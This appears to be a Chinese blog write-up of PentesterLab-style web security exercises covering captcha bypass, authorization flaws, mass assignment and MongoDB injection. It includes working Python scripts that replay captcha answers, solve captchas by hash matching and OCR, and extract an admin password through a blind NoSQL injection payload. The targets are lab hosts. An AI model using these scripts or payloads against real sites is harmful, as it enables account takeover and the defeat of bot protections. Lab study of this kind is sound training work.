这其实是一个很有意思的例子，因为这是我做这系列练习时候的一个错误
Here, you don't have to really crack the captcha. You just need to crack it
once and you can reuse the same value and session ID to perform the same
request again and again. When you try to crack a captcha, make sure that an
answer can only be used once. You can easily script this exploitation by
writing a script that takes a session ID and a value for parameters, and
submit them again and again.
在这，你不必真正的暴破验证码。你只需要破解一次然后可以重复使用只一个值和sessionid。 当你尝试破解一个验证码时， 要确保一个答案只可以被使用一次。
你可以轻易的用带sessionid与值为参数的脚本来重复提交来暴破它。
照着这个例子写了一个函数，也不知道对不对..
    def captcha4():
        url = "http://10.108.40.237/captcha/example4/submit?captcha=amber&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2"
        header = {
            "Cookie" : ("rack.session=e4fd1291b79bf27d8728c7f3bc4e5f9f55f2610794ea476f5b3a5bf5009a8eb4"),
            "Referer" : "http://10.108.40.237/captcha/example4/"
        }
        ss = requests.session()
        while True:
            html = ss.get(url, headers=header)
            print "html.code: {}".format(html.status_code)
            if "Success" in html.text:
                print "[*] Done"
                break
            else:
                print "[-] Error"
5\. 多提交几次，就会发现这个验证码样本很少。我们可以把它都保存下来，然后每次用验证码与保存下来的做对比。就可以搞定。
    def captcha5():
        url = "http://192.168.60.114/captcha/example5/"
        post_url = "http://192.168.60.114/captcha/example5/submit?captcha={}&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2"
        # base_url = "http://10.108.40.237/"
        ss = requests.session()
        captcha = {}
        # get pic md5
        dirs,folder,files = os.walk("./pic/").next()
        for fi in files:
            if fi.endswith("png"):
                path = os.path.join(dirs, fi)
                with open(path, "rb") as f:
                    md5 = hashlib.md5(f.read()).hexdigest()
                    print fi, fi[0: -4]
                    captcha[md5] = fi[0: -4]
        # get pic
        html = ss.get(url)
        # print html.text
        # print html.content
        soup = BeautifulSoup(html.text, "html.parser")
        src = soup.select("img")[0]["src"]
        print src
        img_data = ss.get(url + src).content
        print "[+] img_url: {}".format(url + src)
        with open("pic.png", "wb") as f:
            f.write(img_data)
        with open("pic.png", "rb") as f:
            img_md5 = hashlib.md5(f.read()).hexdigest()
        if img_md5 in captcha:
            html = ss.get(post_url.format(captcha[img_md5]))
            print "img_content: {}".format(captcha[img_md5])
            print "post_url: {}".format(post_url.format(captcha[img_md5]))
            # print html.text
            if "Success" in html.text:
                print "[+] Successful.."
            else:
                print "[-] Somethine Wrong"
6\.
第六题与第七题都可以用tesseract来识别，不需要做其它的操作，所以脚本都写在一个函数了。这里只试了一次，到时候可根据情况来看是否需要写个循环来提交。因为正确率可能不是100%。
    def captcha67():
        url = "http://10.108.40.237/captcha/example8/"
        login_url = "http://10.108.40.237/captcha/example8/submit?captcha={}&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2"
        ss = requests.session()
        html = ss.get(url).text
        soup = BeautifulSoup(html, "html.parser")
        pic_src = soup.select("img")[0]["src"]
        img_data = ss.get(url + pic_src).content
        img_name = "captcha6.png"
        with open(img_name, "wb") as f:
            f.write(img_data)
        def img_2_str(filename):
            cmd = "tesseract {} {}"
            print cmd.format(filename, filename)
            strs = ""
            try:
                output = subprocess.check_output(cmd.format(filename, filename), shell=True)
                with open(filename+".txt", "r") as f:
                    strs = f.read().strip()
                return strs
            except:
                print "[-] Error Happend!"
                return strs
        result = img_2_str(img_name)
        if result != "":
            html = ss.get(login_url.format(result)).text
            if "Success" in html:
                print "[+] OK!"
7\. 第8题的验证码需要做处理，同时还要分粘连的情况…
这题没做好，去噪这一部分我做了，但是处理粘连没有做好，所以识别不出来。放上几个链接吧。[初探验证码识别](http://static.hx99.net/static/drops/tips-4550.html)，[常见验证码的弱点与验证码识别](http://static.hx99.net/static/drops/tips-141.html)，[简单验证码识别及工具编写思路](http://static.hx99.net/static/drops/tips-13043.html)。
8\. 第9题的验证码是题解，并且不是写在图片上的，可以直接正则匹配出来然后计算识别提交。脚本如下:
    def captcha9():
        url = "http://10.108.40.237/captcha/example9/"
        post_url = "http://10.108.40.237/captcha/example9/submit?captcha={}&submit=Submit"
        ss = requests.session()
        html = ss.get(url).text
        soup = BeautifulSoup(html, "html.parser")
        form = soup.select("form")[0].text
        print ((form.strip()))
        captcha = re.match(r"(d+[+-*/]d+)s+=", (form.strip()))
        if captcha:
            result =  eval(captcha.group(1))
            html = ss.get(post_url.format(result)).text
            if "Success" in html:
                print "[+] OK"
**授权**
1\. 这是一个未授权访问，只要知道了url，不用登录也可以访问。
2\. 登录user1/pentesterlab 并访问user2的内容。即水平权限提升。User1只有infos/1
infos/2两个文件，但是访问infos/3, 即user2的内容时，也可以访问的到。
3\. 与上一题一样，使用user1的帐户访问user2的内容。不过这次是在修改的时候。只能看到…
**覆盖属性**
在web开发的时候，如果用数据库做存储时会有很多手工写的sql语句。为了方便开发人员，于是开发出了对象关系映射（Object-relational
mapping）
以方便不懂sql的开发人员来做数据库的操作。在ruby中，可以用@user=User.find_by_name(‘pentesterlab’)
来进行数据库的查询与结果的返回。除此之外还有创建与更新等操作。
但这并不能保证安全性，如果开发人员没有对参数做好判断，就会出现重置某些属性的问题。这就是覆盖属性。 下边看几个例子。
1\. 目的是创建个admin权限的用户。观察参数，发现是user[username]=&user[password]= 那么我们试着添加一个admin
属性。
2\.
目的同1一样，创建一个admin权限的用户。但是在创建时并不行。那么我们创建一个普通用户进去，发现有一个更新简历，那么在更新处添加admin属性就可以。
3\.
同前2个差不多，但是这里要猜一个company_id的字段。因为在一对多的结构中，即一个company对应多个user，那么在user表中会多一个company_id的外键指向company表。
**Mongodb**
mongodb是应用很广泛的一种nosql数据库，虽然不用sql，但是同样存在安全问题。 放几个参考链接： [owasp nosql
injection](https://www.owasp.org/index.php/Testing_for_NoSQL_injection),
[hacking node.js and mongodb](http://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html) ,[ hacking node.js and
mongodb2](http://blog.websecurify.com/2014/08/attacks-nodejs-and-mongodb-part-to.html) 。
1\. 在登录时，如果是mysql这种关系型的数据库，我们可以构造真值等式来绕过。如 or 1=1。 在nosql中同样可以， || 1==1
在nosql中相当于 or 1=1 在sql中。 那么我们可以这样绕过。
2\. 说实话，这个我也没解出来，在看了答案之后发现是这样的。 根据一点猜测(或者对应用的了解)，想必这里还有一个password字段。可以这样来猜测.
    url: http://localhost/mongodb/example2/?search=admin’ && this.password.match(/./)//+%00
其中最后的// 类似于sql中的– 即注释作用。而%00 空字符也可以阻止后边的执行。 还可以加上正则中的 ^ $ 分别限定。
如果成功，则返回结果，如果false，则无结果返回。 脚本如下：
    def nosql2():
        strs = string.lowercase + string.uppercase + string.digits
        url = "http://10.108.40.237/mongodb/example2/?search=admin%27%20%26%26%20this.password.match(/^{}$/)//+%00"
        password = ""
        while True:
            for char in strs:
                tmp = password + char
                html = requests.get(url.format(tmp + ".*"))
                if "admin" in html.text:
                    password += char
                    print "[-] find a char:{}".format(password)
                    break
            html = requests.get(url.format(password))
            if "admin" in html.text:
                print "[+] Done! password:{}".format(password)
                break